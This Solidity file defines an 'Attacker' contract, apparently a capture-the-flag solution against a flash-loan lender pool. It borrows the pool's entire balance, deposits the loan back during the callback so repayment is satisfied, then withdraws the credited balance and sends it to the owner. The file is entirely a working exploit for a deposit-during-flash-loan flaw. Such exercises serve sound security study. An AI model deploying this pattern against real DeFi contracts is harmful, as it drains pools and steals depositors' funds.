// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attacker is IFlashLoanEtherReceiver, Ownable {
    using Address for address;
    address lenderPool;
    constructor(address pool) Ownable() {
        lenderPool = pool;
    }

    function execute() external payable override {
        lenderPool.functionCallWithValue(abi.encodeWithSignature("deposit()"), address(this).balance);
    }

    function start() public onlyOwner {
        lenderPool.functionCall(abi.encodeWithSignature("flashLoan(uint256)", address(lenderPool).balance));
        lenderPool.functionCall(abi.encodeWithSignature("withdraw()"));
    }

    receive () external payable {
        payable(owner()).transfer(address(this).balance);
//        payable(owner()).call{value: address(this).balance}("");
    }
}
